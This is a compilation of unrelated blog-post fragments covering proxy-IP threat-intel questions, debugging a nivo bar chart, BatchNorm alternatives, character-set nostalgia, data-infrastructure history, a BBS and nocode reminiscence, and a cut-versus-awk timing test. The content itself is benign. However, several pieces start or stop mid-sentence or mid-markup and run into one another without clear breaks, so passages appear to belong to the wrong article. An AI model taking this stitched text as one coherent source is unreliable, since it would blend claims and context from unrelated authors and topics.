<li><p>The IPs have a wide range of activity volume. What threads can we pull from less active gateways?</p>
</li>
<li><p>Are we looking at the wrong thing? There is a high overlap with the Geo Surf residential proxy network. Perhaps this is the actual tradecraft for this actor.</p>
</li>
<li><p>Lots of threat intelligence services have picked up these IP addresses as high risk. Does that actually make sense for a shared commercial VPN?</p>
</li>

data around New York’s 50a police disciplinary record requests.</p><p>My first task was a proof of concept - to put some very basic data in
a bar chart. The data has a single axis: how much each request cost. We
only care about unique costs for the purposes of this visualization, so
the list ended up being only 19 values.</p><pre><code>[

under the hood.</p><p>That’s when things started to get interesting, and by interesting I mean
unexpected, and by unexpected I mean annoying.</p><p>Nivo has lots of documentation, with a really slick display, interactive
widgets and lots of examples on how to solve complex problems. However,
noticeably lacking is much documentation around how to solve simple
problems, like implementing a dead simple bar chart. Equally missing is
a robust getting started document, or a explanation of the architecture
of the library, key concepts, assumptions, and the like.</p><p>Irritating, but fine. I’ve been doing web development long enough not to
be scared away. I dug in, and while it took me longer than I would have
liked to piece together what I actually needed for my little bar chart,
I had a working widget.</p><div><pre><code data-lang="jsx"><span>&lt;</span><span>Bar</span>
  <span>width</span><span>=</span><span>{</span><span>800</span><span>}</span>
  <span>height</span><span>=</span><span>{</span><span>500</span><span>}</span>
  <span>layout</span><span>=</span><span>"horizontal"</span>
  <span>data</span><span>=</span><span>{</span><span>prices</span><span>}</span>
<span>/&gt;</span>
</code></pre></div><p>Well, working was a bit of an overstatement. While it rendered, it
looked, well, <em>off</em>.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/before.png"></figure><p>Was my data wrong? I double and triple checked it, throwing
<code>console.log</code>s all over the place. Everything seemed fine.</p><p>After some careful eyeballing, it seemed like the issue was not that the
data was wrong, but that the display was being cut off.</p><p>I checked the nivo documentation - maybe I missed a vital configuration?
Some CSS file I needed to include? Where’s the option for “render
correctly”?</p><p>Unfortunately all I found was very fancy how-tos on how to render
multi-colored bars with multi-layered data and lots of animations. Cool
stuff, but not helpful here.</p><p>I was starting to get frustrated. How hard could it be to render a dead
simple bar chart?</p><p>I tried extending the <code>width</code> and <code>height</code> attributes on the chart,
but that only made the SVG canvas bigger, leaving in tact the cut-off
values.</p><p>Finally, I broke down and started digging into nivo’s code.</p><h2 id="the-work">The work <a href="#the-work">¶</a></h2><p>While I couldn’t find any documentation on it, maybe there was a CSS
file I needed to include? I poked around in the SVG source that nivo
generates, and noticed that the SVG elements did not include any classes
or ids. That hinted that there was no default CSS file to include, but
to check my assumption, I searched the entire node package for any CSS
file.</p><pre><code>find ./node_modules/@nivo/ -type f -name "*.css"
</code></pre><p>That returned no results, so I could confidently cross off “forgot to
include library CSS file” from my debugging checklist.</p><p>If there was no external CSS library expected, the chart would have to
be styled another way. SVGs have lots of styling effects via the use of
properties; maybe something in there was amiss? Seemed like a stretch
that there was a bug in the library for rendering such a simple graphic,
but I didn’t have any better ideas, so I started combing through the SVG
markup.</p><p>I didn’t notice anything strange about the SVG properties, but I did
notice lots of inline CSS styles. Okay, so that makes sense; the library
needs more styling power than pure SVG, and since it isn’t using an
external CSS source, it’s injecting the styles on each element directly.</p><p>That made me challenge a core assumption I had been making: that the
library was smart enough to fit the data given inside the SVG canvas.
After checking the API documentation again with my new hypothesis
goggles, I found the <code>margin</code> property, with this description:</p><blockquote><p>Chart margin.</p></blockquote><p>Not exactly the clarification I was hoping for, but my new theory was
that since the library only dealt in inline styles (seeing as another
docs search found no method of passing in custom CSS class/id values)
and values being cut off is essentially an offset issue, I figured that
<code>margin</code> sounded close enough to how I hoped the styles could change.</p><p>I slapped that sucker on the component, and sure enough, it fixed the
issue. My assumption was (unfortunately) correct; you have to explicitly
set <code>margin</code>s for your simple bar chart, otherwise nivo might not
display it properly.</p><p>This would have been really helpful to have outlined in a core concept
document, and was rather disheartening, because it meant that component
configuration is tied directly to the shape of the data, adding a
maintenance headache. However, it worked, and that issue was for future
Chris to deal with.</p><p>Unfortunately, I wasn’t completely done. Since my chart was so simple,
containing only one value column, I wanted to simplify the display. By
default, the nivo chart outputs x and y axis labels, as well as a label
overlaying the bar itself. This is great for complex, multi-axis data,
but for a simple chart like this was entirely redundant, and also caused
overlapping values because of the vast differentials between them.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/iteration-1.png"></figure><p>My ideal state was to hide the x and y axis displays, and just use the
label overlaying the bar, since the data isn’t relational. However,
nivo does not present an option for this. It does provide an option for
hiding the overlay labels, so I went with that.</p><p>That fixed the overlapping data issue, yet the y axis was still
redundant and potentially confusing.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/iteration-2.png"></figure><p>Again, nivo offers no way to hide this display, so I turned to the dark
arts: hacky CSS.</p><p>Since nivo doesn’t supply unique identifiers for elements, nor does it
supply a method to pass in your own, I resorted to this monstrosity:</p><div><pre><code data-lang="css"><span>.</span><span>headline__costs</span> <span>+</span> <span>svg</span> <span>&gt;</span> <span>g</span> <span>&gt;</span> <span>g</span><span>:</span><span>nth-child</span><span>(</span><span>2</span><span>)</span> <span>{</span>
  <span>display</span><span>:</span> <span>none</span><span>;</span>
<span>}</span>
</code></pre></div><p>Eagle-eyed CSS-folk will have noticed that this code is brittle as hell;
if the nivo library changes how it outputs it’s SVG markup, say, moving
the y axis to be the first child instead of the second, this code will
hide the wrong element.</p><p>That being said, this works for now, and provides some real value by
making the data visualization more clear.</p><figure><img src="https://www.chrisdeluca.me/article/rendering-simple-bar-chart-nivo/images/final.png"></figure><h2 id="conclusion">Conclusion <a href="#conclusion">¶</a></h2><p>And that’s my journey with nivo so far; an impressive library with lots
slick functionality, but some strange omissions around dynamically
rendering data shapes and a lack of basic documentation.</p><h3 id="in-closing-nivo-does">In closing, nivo <em>does</em>: <a href="#in-closing-nivo-does">¶</a></h3><ul><li>Render SVGs using only inline CSS</li><li>Allow some style tweaks to that inline CSS via component properties</li><li>Allows hiding overlay labels</li></ul><h3 id="nivo-does-not">Nivo <em>does not</em>: <a href="#nivo-does-not">¶</a></h3><ul><li>Automatically render chars so that all given data is visible (offsets must be manually set via the <code>margin</code> property for each dataset)</li><li>Provide getting started documentation aimed at new users</li><li>Provide documentation on core concepts for how the library functions</li><li>Make rendering a simple bar chart simple (oooh, 🌶️!)</li></ul><p>Thanks for reading!</p></div></div>]]>

  </figure></div></div></div><p>BatchNorm<sup id="fnref-1"><a href="#fn-1">1</a></sup> is a technique for normalising the outputs of intermediate layers inside a neural network using the batch's statistics. The method was originally designed to "reduce internal covariate shift" - to force all of the intermediate layers to have zero mean and unit variance so that the outputs do not explode (especially in deep networks) and keep everything nice and centered around zero. And BatchNorm has proved vital to getting networks to train, enabling larger learning rates, faster training and results that generalise better. But since the algorithm's original publishing, much more work has been done identifying why BatchNorm works. And it's not because it reduces covariate shift (mostly), but rather because it has a profound impact on the loss landscape<sup id="fnref-2"><a href="#fn-2">2</a></sup> that the algorithm must traverse in order to find an optimal solution. BatchNorm smooths the loss landscape so that our optimizers can find good solutions much easier. But with this in mind, couldn't we design a better normalisation strategy? One that uses our better understanding of why it works the way it does. Well that's what I hope to explain in this article.</p><h2 id="batchnorm"><a href="#batchnorm" aria-label="batchnorm permalink"></a>BatchNorm</h2><p>As a brief reminder, BatchNorm normalises batches using the mean and variance of the batch during training according to the following formula:</p><p><span><span><span><math><semantics><mrow><mtext>BN</mtext><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>γ</mi><mfrac><mrow><mi>x</mi><mo>−</mo><mi>μ</mi></mrow><msqrt><mrow><msup><mi>σ</mi><mn>2</mn></msup><mo>+</mo><mi>ϵ</mi></mrow></msqrt></mfrac><mo>+</mo><mi>β</mi></mrow><annotation encoding="application/x-tex">\text{BN}(x) = \gamma\frac{x-\mu}{\sqrt{\sigma^2+\epsilon}}+\beta</annotation></semantics></math></span></span></span></p><h2 id="why-should-we-replace-batchnorm"><a href="#why-should-we-replace-batchnorm" aria-label="why should we replace batchnorm permalink"></a>Why Should we Replace BatchNorm?</h2><p>BatchNorm has proven instrumental to creating and training increasingly deeper networks, providing stability to training and reducing training times. Nevertheless, there are a few drawbacks to the method:</p><ol><li><p>One of the main reasons that researchers look for alternatives to BN is when training a network with a small batch size. Since BatchNorm generates statistics across the batch, if the batch size is small, the standard deviation is likely to be very small for at least one batch of data, leading to numerical instability in the normalisation. But with the increasing model and input sizes used in modern networks, the batch size must be small to fit into memory, leading to a trade off between the size of the architecture and the size of the batch.</p></li><li><p>Additionally, the original premise behind BatchNorm proved to be somewhat incorrect<sup id="fnref-2"><a href="#fn-2">2</a></sup> - but the technique still worked (like a lot of other bugs in ML). With this improved knowledge could it not be possible to further improve the normalisation by redesigning it now. It's a bit like, after learning how an oven works, we create a new cake recipe to use this knowledge.</p></li><li><p>BatchNorm creates trouble for different domains when using transfer learning. When transferring from one domain to another, particularly with little data, the input has a different distribution. As a result, the normalization is particularly skewed and may ruin the training. In particular, this happens when just training the head of the network - a common practice in transfer learning. As a result, we have to train the BatchNorm layers (or make sure that they are in inference mode) in order for the body of the network to produce sensible results to train the head on.</p></li><li><p>BatchNorm has different training and testing phases, making the generalisation slightly more unpredictable. The network can't dynamically adjust to an input that has a completely different distribution than the ones it has previously encountered, which may lead to strange performance<sup id="fnref-4"><a href="#fn-4">4</a></sup>.</p></li></ol><h2 id="setting-the-baseline"><a href="#setting-the-baseline" aria-label="setting the baseline permalink"></a>Setting the Baseline</h2><p>For the most part of this exploration, I will compare two networks: a small 4 layer convolutional network and a ResNet18, both trained on <a href="https://github.com/fastai/imagenette" rel="nofollow noopener noreferrer">Imagenette</a>, and averaged over 3 training runs each.

Well the first possible solution would be to increase the epsilon parameter in the divisor of the normalisation step which is used to prevent numerical instability. If we increase it to 0.1 then the output of the normalisation will be constrained to <span><span><math><semantics><mrow><msqrt><mn>10</mn></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{10}</annotation></semantics></math></span></span> times the input.

Why is this? While the normalisation step is much the same, and thus the forward pass results in the same numbers, the backward pass is very different. Since the running statistics are detached from the batch statistics (there is no connection between them and thus they are treated as constants), the gradient is very different between BatchNorm and RunningBatchNorm. The gradient no longer takes into account the gradient of the batch statistics. And this effect turned out to be more important than normalising the internal layers<sup id="fnref-2"><a href="#fn-2">2</a></sup>.</p><h2 id="comparing-the-gradients"><a href="#comparing-the-gradients" aria-label="comparing the gradients permalink"></a>Comparing the Gradients</h2><p>The original authors of BatchNorm left the "precise effect of Batch Normalization on gradient propagation" as a further area of study. So, after some time, the effect of BN on the loss landscape was studied<sup id="fnref-2"><a href="#fn-2">2</a></sup>. It turns out that the whitening in BatchNorm using the batch statistics smooths the loss landscape. This means the gradients are more predictive - if you take a step in the direction of the current gradient, it is quite likely that you will continue moving in the same direction for the next gradient step. So if you doubled the learning rate, then things are just fine.</p><p>A smooth loss landscape prevents exploding and vanishing gradients and reduces the reliance on a good intialisation and a tuned, small learning rate. And while BatchNorm reparametrizes the loss using the batch statistics, it still keeps the same minima, since the parameters <span><span><math><semantics><mrow><mi>β</mi></mrow><annotation encoding="application/x-tex">\beta</annotation></semantics></math></span></span> and <span><span><math><semantics><mrow><mi>γ</mi></mrow><annotation encoding="application/x-tex">\gamma</annotation></semantics></math></span></span> can always be set to undo the whitening transform.</p><p>We can write out the gradients using backpropagation through a batchnorm layer and compare those with the RunningBN layer to see what changes.</p><div><div><div><figure>

But how does this show up in the gradients empirically, when training a network. Here we plot the L2 norm of the gradients throughout training for all the convolutional layers in the networks without and with BatchNorm and using RunningBatchNorm.</p><p>What we expect to see is how using BatchNorm results in gradients that don't explode or vanish. As we go deeper into the network, if the norm of the gradients keeps increasing or decreasing, then training becomes harder for the network. So ideally, we want to see the norms of the gradients remain roughly constant across iterations and layers. Additionally, we want fairly stable gradients that don't have any large drops or rises. In the non-normalised graph, we can see that there is a steep dropoff at the beginning, followed by a continual rise. The BatchNorm graph is much more stable. Furthermore, the L2 norm of the BN and RunningBN graphs are very similar, however, the L2 norm doesn't quite tell us enough about the <em>quality</em> of the gradients.</p><div><div><div><figure>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>When I was growing up using computers I was clueless about character sets. Mostly there were just US characters, and everyone converted the umlauts (Ä and Ö) and the A with the overring (Å) used in Finnish to their A, O and A equivalents. I guess you could call that transliteration, and we all did it&nbsp;because we had to. Technology evolved and we got more and more Äs, Ös and Ås in our digital lives. Everyone I knew was using Windows. Life was good. Then came the web and trouble started brewing.</p><div><p>I started my webmaster amateur career sometime in 1996. I still didn't know (or care) much about character sets, and the most common mistakes I made while learning was with images;&nbsp;I accidentally referred to them from my local C: drive or they were so large it would take a fortnight to load with my somewhat outdated 9.6k <a href="https://en.wikipedia.org/wiki/Great_Valley_Products" title="">GVC</a> modem.</p><p>It wasn't until my first "real job" in early 2000 when I got a glimpse of&nbsp;the horrors of character sets. At work <a href="https://en.wikipedia.org/wiki/Art_director" title="">Art Directors</a>&nbsp;were using colorful <a href="https://en.wikipedia.org/wiki/Power_Macintosh_G3" title="">Macintosh G3 tower computers</a> with&nbsp;<a href="https://en.wikipedia.org/wiki/Mac_OS_9" title="">Mac OS 9</a> that didn't seem to run straight for more than a day. Even worse, sometimes they couldn't even display contemporary words like <a href="https://urbaanisanakirja.com/word/larvilautanen/" title="">lärvilautanen</a> or names like <a href="https://www.mikrobitti.fi/uutiset/jaakko-rytsola-oli-lamborghininsa-kanssa-it-kuplan-kasvot-menetti-miljoonat-ja-haluaa-nyt-opettaa-rahan-arvon-uudella-sovelluksella/dc23a929-db4d-4302-ab7d-3b5a8127d0ff" title="">Rytsölä</a> right. I&nbsp;snickered and crouched over the keyboard of my rock-solid <a href="https://en.wikipedia.org/wiki/Windows_NT" title="">Windows NT</a> workstation to&nbsp;craft some fine artesan HTML with notepad.exe.</p><p>The early 2000s were an intense learning experience for me. I switched over from <a href="https://en.wikipedia.org/wiki/Microsoft_Notepad" title="">Microsoft Notepad</a> to <a href="https://medium.com/@velmu/is-it-time-to-reconsider-dreamweaver-34d442e5c278" title="">Macromedia DreamWeaver</a> to <a href="https://en.wikipedia.org/wiki/Macromedia_HomeSite" title="">Allaire HomeSite</a>. My career peaked when I worked on&nbsp;<a href="http://web.archive.org/web/20001019003024/http://www.bomfunk.net/main_first.html" title="">the homepage for Bomfunk MCs</a>.&nbsp;I felt invincible. I ran into trouble with characters occasionally, but the "real developers" working with ASP or Java were always willing to help the front end developer greenhorn&nbsp;navigate the seas of broken <a href="https://en.wikipedia.org/wiki/Verdana" title="">Verdana</a> on a manager's&nbsp;screen. Every so often I also had issues with <a href="https://en.wikipedia.org/wiki/Newline" title="">line breaks</a> too, but the bearded guy always helped me out. I think he used <a href="https://en.wikipedia.org/wiki/Solaris_(operating_system)" title="">Solaris</a>.</p><p>I didn't really start my hate-hate relationship with characters until around 2003. At twenty-three I was now a <em>Senior Developer</em>, and had stretched my wings to the server-side as well with mad LAMP&nbsp;skillz and setting up vhosts on Apache. I was, what you would now call&nbsp;a <em>Senior Fullstack Ninja</em>. Or that's how I saw myself. I was&nbsp;the person people came to get advice from, knee-deep in JavaScript, having innovated an <a href="https://janit.iki.fi/pdf/tarvainen_thesis-040428.pdf" title="">amazing client-side bug tracker</a>&nbsp;that would change how we work. Little did I know.</p><p>At this point I was also working on some projects for a well-known (at the time) Finnish mobile phone manufacturer in foreign languages like Hebrew&nbsp;and Hungarian. This is when it all started falling apart. In the past I had been able to solve issues with weird characters by poking them with a stick or the magical&nbsp;<em>charset=iso-8859-1</em>&nbsp;metatag. But things were gradually getting worse. I was increasingly unable to use HomeSite because the characters were garbled. After too many <a href="https://www.youtube.com/watch?v=YYv4yadRexY" title="">Jallu</a> shots, I&nbsp;opened up to a guru about this and he mumbled something about no support for UTF-8.&nbsp;</p><p>Now I was a man on a mission. I would find out all about this UTF-8 and conquer this land of <a href="https://en.wikipedia.org/wiki/Standard_Generalized_Markup_Language" title="">SGML</a>-like markup once again. I armed myself with all the information on the interwebs and even bought a hard copy of the&nbsp;<a href="https://www.oreilly.com/library/view/unicode-explained/059610121X/" title="">O'Reilly mini reference on UTF-8</a>. Then I kind of got it, but things were complicated in the real world. Some things were <a href="https://en.wikipedia.org/wiki/UTF-8" title="">UTF-8</a>, some <a href="https://en.wikipedia.org/wiki/ISO/IEC_8859-1" title="">ISO-8859-1</a> and occasionally there was some random <a href="https://en.wikipedia.org/wiki/Macintosh_Latin_encoding" title="">Macintosh Latin</a> from a unicorn who could do design and HTML. I read deeper and started seeing nightmares about monsters like the the <a href="https://en.wikipedia.org/wiki/Byte_order_mark" title="">Byte Order Mark</a> and&nbsp;<a href="https://en.wikipedia.org/wiki/Endianness" title="">Endianness</a>. Cumulatively I spent weeks on&nbsp;figuring out character sets from files&nbsp;and parsing out something not fÃ©d.</p><p>I was still quite confused&nbsp;with the prospect of <a href="https://en.wikipedia.org/wiki/UTF-16" title="">UTF-16</a> and what it would mean for me. Gladly that seemed to have been a whole lot of nothing, and with a steady&nbsp;diet of Linux, OS X and Windows on the desktop it seemed the worst was over. There were some cases where I needed to figure out strange issues with broken characters (usually because of using <a href="https://janit.iki.fi/shit/PHP-the-good-parts.png" title="">non-multibyte safe functions</a> on the server), but this was much more of my own fault than random wonky encodings from input data.</p><p>Still, there were some systems not using UTF-8 by default.&nbsp;There was little incentive for that as it wasn't like there were new letters being added to the English alphabet&nbsp;or anything. This changed gradually with the mainstream adoption of smartphones and <a href="https://en.wikipedia.org/wiki/Emoji" title="">Emojis</a>. Those cute little&nbsp;🖼️s are essentially new letters to the alphabet. To stay relevant in the age of social media you had to support emoji&nbsp;or you were&nbsp;💀 in the 💧. Fast forward to today and I can't remember the time I wrestled broken characters.</p><p>There are still enterprise&nbsp;systems that can suffer a death by a thousand candy-bar emojis&nbsp;and <a href="https://dev.mysql.com/doc/refman/8.0/en/charset-unicode-utf8mb4.html" title="">UTF-8 quirks in MySQL</a>, but overall I am now in a much happier&nbsp;place. I still don't really know how all this <a href="https://en.wikipedia.org/wiki/Plane_(Unicode)" title="">character set black magic</a>&nbsp;works deep down, but I don't need to know. For most part it's now a non-issue in my life. And it's amusing to see <a href="https://www.engadget.com/2017-10-31-apple-ios-11-1-new-emojis-security-updates.html" title="">Apple using new emojis as a carrot</a> to get people to install the latest security patches. This was a fun nostalgia trip, but I certainly wouldn't want to go back in time to work on multilingual web development. Or implement designs with rounded corners.</p><p>I'd like to extend a&nbsp;big thank you to everyone for using emoji! You saved my&nbsp;🍑!</p><p>Photo by <a href="https://unsplash.com/@christiannkoepke?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Christiann Koepke</a> on <a href="https://unsplash.com/s/photos/peaches-tree?utm_source=unsplash&amp;utm_medium=referral&amp;utm_content=creditCopyText">Unsplash</a></p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>November 16, 2020</p></header><p>Today, the data ecosystem is thriving, buzz words are everywhere and new product names pop up every day. It makes it hard for people that step in the field to see the signal in the noise.</p><p>In this article, I try to take a step back and explain what the current ecosystem is made of. <em>Why do we have this multitude of products and where does every part fit in the modern enterprise ?</em> There will be quite some simplification. In reality, every company is different and has different needs.</p><h3>Early 2000s : The rise of the internet and data volumes</h3><p>With the rise of the internet, companies struggled with the growing number of data sources they had to handle. Company data got siloed in different relational databases.
This prevented companies from quickly getting <strong>data analytics</strong> and <strong>actionable insights</strong> about customers, sales…</p><p>Data warehouses provided a solution by bringing together all the siloed relational databases into one single source of truth, used to provide a 360° view of customer data.</p><p><svg xmlns="http://www.w3.org/2000/svg" id="svg917" version="1.1"

    </span><h3>2010 to 2015 : Cloud transition and the shaping of modern data warehouses</h3><p>Nevertheless, during the early 2010’s, the majority of large companies were still hesitating about whether to stay on-premise or move to the cloud, and kept waiting for a major Big Data service provider that made things easier.</p><p>Only early adopter large companies made the move to invest in Big Data technologies. It turned out that it wasn’t a simple technology adoption, but it needed a company wide <strong>data driven culture,</strong> new job titles and a multitude of complex data processes.</p><p>During these years, a pattern change happened for data warehouses.</p><p>Due to data volume increase and data variety, as well as due to the rise of business analytics expectations, companies started experiencing a bottleneck on the staging layer of the data warehouse. It usually took weeks or months to integrate a new data source in the Extract - Transform - Load pattern.</p><p>In addition to structured transactional data, companies started to collect more and more behavioral data with a fast changing schema.</p><p>Finally, there was a realization that storage costs were far more affordable than before. Computation power of the data warehouses also went up. Therefore, it made sense to load the data in the warehouse before transforming it.</p><p>3 shifts started happening :</p><ul><li><strong>From ETL</strong> (Extract-Transform-Load) <strong>to ELT</strong> (Extract-Load-Transform)</li><li><strong>From On premise to the Cloud</strong>  : Cloud service providers could provide easy and elastic data warehouses that fit the company needs.</li><li><strong>from Hadoop to new Data Lakes</strong>: Data Lakes are centralized raw data staging areas, (It could be a simple Amazon S3 repository or Google Cloud Storage, or it could have more capabilities)</li></ul><p>Moreover, the rise of infrastructures that can handle huge amounts of data paved the way to the rise of IoT and connected objects which found a lot of success. This, in turn, increased the amount of data some companies had to handle.</p><h3>2015 - 2017: Data Plumbing and AI Hype</h3><p>The main Big Data infrastructure seams clearer to most companies, the main challenges are now about how to easily and quickly ingest data and how to quickly make it available to analysts and business users.</p><p>Data Engineers are hired to take care of the data plumbing around the modern data warehouse. We see the rise of data flow automation tools like Apache Airflow. These tools enable companies to automate the ingestion and the transformation part of a data pipeline.</p><p>We feel that NoSQL loses some momentum and SQL is officially back with tools that allow SQL queries on unstructured and structured data warehouse data. (Snowflake, BigQuery)</p><p>The “Big data” hype reaches a plateau, not because it’s not relevant anymore, but because it’s now a reality. A new field retains most of the media attention. Artificial intelligence is the new gold. Following some deep learning advancements, Machine learning gains a lot of attraction.</p><p>This, democratizes the <strong>operational use of AI</strong> to explore and offer <strong>data powered products</strong>. (Recommendation systems, Predictive maintenance …) . As a result and thanks to the stabilization of ML methodologies, we saw the birth of DataOps collaborative platforms that enable companies to easily experiment with ML models on business data.</p><blockquote><p>For large organizations: if you’re not actively building a Big Data + AI strategy at this point (either homegrown or by partnering with vendors), you’re exposing yourself to obsolescence. - Matt Turk</p></blockquote><span>

    </span><h3>2018 - 2020: Current challenges</h3><p>From 2018 to 2020:  Most of large companies started or are going through their Cloud transition.</p><p>Engineers kept on working on tools to access and process raw data easier and faster.</p><ul><li>Some tools like (dbt) made it possible to use SQL as the transform layer.</li><li>Stream processing approaches are getting more attraction.</li></ul><p>Here are some of the challenges companies are facing today :</p><ul><li>Hybrid Cloud :
In order to avoid vendor lock-in and optimize costs, many companies are opting for hybrid approaches with a mix of private cloud, public cloud and on-premise.</li><li>Data cataloging and meta data management :
Data and data sources are the base of this whole systems. They need to be properly indexed, enriched and referenced to make it easier for anyone to find them and know how to use them.
In the same vein, we see the need for “feature catalogs” needed in the machine learning pipeline.</li><li>Data quality :
Data quality means ensuring data integrity, consistency, availability and usability at every stage of the data pipeline.</li><li>Security and privacy :
Following the Facebook Cambridge Analytica scandal, privacy issues became more important for companies and for the general public.
New regulations like the GDPR (General Data Protection Regulation) and CCPA (California Consumer Privacy Act) introduced new data tracing and security constraints.
Companies need easy solutions to centralize data access controls. The use of data must be traced and controlled.</li></ul><p>Below, you’ll find a quite complete reference architecture diagram of the modern data infrastructure.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the early 90s I ran a BBS&nbsp;<span>(Bulletin Board System)</span><span>&nbsp;</span><span>on my ridiculously tricked out Amiga
500.&nbsp; It had a 20 MB hard drive the size
of a shoe hanging off the side, an internal CPU expansion board upgrading to a
zippy 68020 clocking 33MHz, and a USRobotics dial up modem at 28800 baud connected
to the serial port at the back. This was, if not quite before the Internet, at
least before the Internet had made it to my teenage bedroom. No WhatsApp, but
you could send messages to other users on the BBS, and even between BBSes if
the sysop had connected to FidoNet. Which I had not because the purpose of the
BBS was not social networking. I am not quite sure when the statute of
limitations expires for copyright violations on distribution of cracked games,
so I will plead the fifth on the name of my BBS. Suffice it to say, compared to
swapping floppy disks over mail, BBSs were considered a technical improvement associated
with social degeneration because it did not require a fingerspitzengefühl for sending
mail in such a way that the stamps could be reused - with a thin layer of glue
or appropriate placement on the envelope to confuse a sleepy post office
employee. I had no interest in playing any of the games passing through my
hands. I was a socially awkward teenager seeking the approval
of a cooler crowd by being the first to supply the latest wares.</span></p><p>In case you are wondering, by the way, running a BBS on a
dial-up modem means that you can only have one user at a time. Each BBS was a phone
number with a dedicated landline, or worse, harassed parents persuaded to
unplug the house phones at 10 PM to run a part-time service until the morning.
But if you dialled and there was another user connected, you got the busy
signal. <o:p></o:p></p><p>There were several choices for the software to operate BBSes
on the Amiga. I think I settled on AmiExpress, which was easy to get running but
offered limited options for customising the user experience. There was a
messaging area, a chat facility with the sysop should they be awake, and the
all-important file exchange for uploading and downloading goodies. And it was
sparkling ANSI colourful out-of-the-box. My friend’s brother swore by the Paragon
BBS software which was clunkier but allowed you to install small text games like
snake. But he was a traitor and shortly thereafter switched the Amiga to a PC.</p><p><img src="https://blog.saltcorn.com/files/serve/4"></p><p>I liked exploring the different BBS software systems though.
They weren’t particularly configurable, it was mostly options that could be
switched on and off and some ASCII art that could be configured. At some point I
heard a rumour of something amazing: Freeform. <a href="http://software.bbsdocumentary.com/COMMODORE/AMIGA/FREEFORM/" target="_blank">Here is the only reference</a> I can find on
the Internet to Freeform, which promised to change everything for BBS sysops:<o:p></o:p></p><blockquote>This new BBS software not only allows every config value
imaginable to be set/changed by the SysOp, but the entire design and
flow-of-logic that operates the bbs can also be altered. It will eventually be able to emulate
menus/msg-bases/file-bases/etc of all known (42) Amiga BBS software packages
(as well as those of your own design). SWHQ is currently beta-testing this software.</blockquote><p>I had yet to learn the meaning of the word “vapourware”, so I
was very excited. Imagine being able not just to switch the text but also the
logic flow! If I had had that kind of power, I would probably have had no idea what
to do with it. <o:p></o:p></p><p>Freeform never happened. Much as I looked, I never found any
further information or updates from the project. And eventually I too became a
traitor and switched to a PC.<o:p></o:p></p><p>I started thinking back to Freeform almost 30 years later when
I began to work on Saltcorn, an open-source nocode platform. In
many ways, BBSes were the websites of their time, and BBS software systems
compare to nocode platform in the trade-offs they make between ease-of-use and
configurability. The BBSes were not serious businesses in the same way that apps
can be real startups with venture capital funded stand-up ceremonies
in bona-fide co-working spaces. Which precisely answers the charge that my
programming friends make against nocode products: that they are ticking time
bombs of technical debt, that they will never scale or be anything buy a toy. To
which I say: there are plenty of websites and applications and information
products out there that can be built without an engineer in sight and that may
not be unicom prospects but still deliver real value to their communities. One
can do an awful lot with WordPress, an indisputable nocode success story. The
next generation of nocode platforms are about pushing the boundaries of what
can be built without funding , without an engineering team and without writing
a line of code. <o:p></o:p></p><p>So even if Freeform never existed, or was just a cruel joke, I
am building it under a new name 30 years later as a gift to all the socially awkward teenagers out there and anyone else who has a
burning idea they need to build. Just do not use it for pirating cracked games,
it is not going to make you look cool.<o:p></o:p></p></div></div>]]>

<br>
<h3>The UNIX philosophy</h3>

<p>
In UNIX, there is (or used to be) a philosophy which, among other things, 
stipulates that a piece of software should do "one thing well". There is 
of course a long-running debate over not only what this really means, 
but also about whether certain programs - if any at all - still adhere 
to this, or ever did.
</p>

<p>
So, we're allegedly in the middle of a dangerous downward spiral of 
constant feature creep and a growing number of command parameters that 
will, eventually, lead to a Grand Unified Program that does everything
poorly (Depending on your personal preference and current mood, replace
the GUP with systemd, Emacs, Windows or Google Chrome as you see fit).
</p>

<p>
I for one find the concept of the UNIX philosophy of doing one thing 
well amicable. I also realize that it is a product of a time when 
computers still mostly passed around text files, and that those text 
files were considered preposterously huge if they exceeded a couple of 
megs in size. Heck, the modern GUI was still a research project at PARC 
when Doug McIlroy wrote the UNIX philosophy down in 1976.
</p>

<h3>Thinkin' 'bout philosophy</h3>
<p>
So, what does it mean to do one thing and do it well? Well, awk has been
a staple of any UNIX diet since the late 1970s. I think it's a lovely
little tool which I use even for rather mundane tasks. It's certainly
changed a bit over the years, but the core concept of the language
remains the same. Still, it's a complete programming language and
can do a lot more than a simple, single-purpose command.
</p>

<p>
The cut command is slightly newer, but like awk, it's a part of the 
POSIX standard. It can also hardly be considered to have suffered much 
feature creep: it's got a rather stringent set of parameters and really 
does just one thing, which is cutting a smaller piece of text out of a 
larger piece of text.
</p>

<p>
The question is of course, does the UNIX philosophy still hold up? Is it always
better to have one small program doing one thing well, as opposed to a
slightly bigger program doing many things? Let's examine this by performing
a simple task with two slightly different twists.
</p>

<h3>Task number one</h3>

<p>
Task number one was to print the second column of a three-column file with
10,000 rows, with a single space separating the columns. This task was
repeated 100 times.
</p>

<p>
<b>cut (GNU coreutils, 43224 bytes)</b>
</p>
<pre>cat cva_in1 | cut -d ' ' -f 2 &gt; /dev/null

real    0m0.297s
user    0m0.288s
sys     0m0.153s
</pre>

<p>
<b>awk (gawk, 658072 bytes)</b>
</p>
<pre>cat cva_in1 | awk '{print $2}' &gt; /dev/null

real    0m0.818s
user    0m0.754s
sys     0m0.232s
</pre>

<p>
<b>Python 3 (Python 3.6, 4526456 bytes + libraries)</b>
<br>
My go-to language for farting around with programming ideas, thus
included for reference. The below two lines of code were written to
a script through which the input was piped and, just as above,
redirected to /dev/null:
</p>
<pre>import sys
for l in sys.stdin: print(l.split()[1])

real    0m5.423s
user    0m4.753s
sys     0m0.873s
</pre>

<p>
As is clearly evident from this highly scientific performance test,
cut is by far the fastest tool for the job. I tried a few different
approaches with Python (such as opening the file from the script
instead of piping it), but they were all similarly slow.
</p>

<h3>Task number two</h3>

<p>
This time, things were spiced up by printing the fifth column in a file 
with unevenly-spaced columns, using the output from "ls -l". The file 
used for testing contained 2235 lines. This task was also repeated 100 
times. Since cut doesn't quite cope with this uneven spacing, we had to 
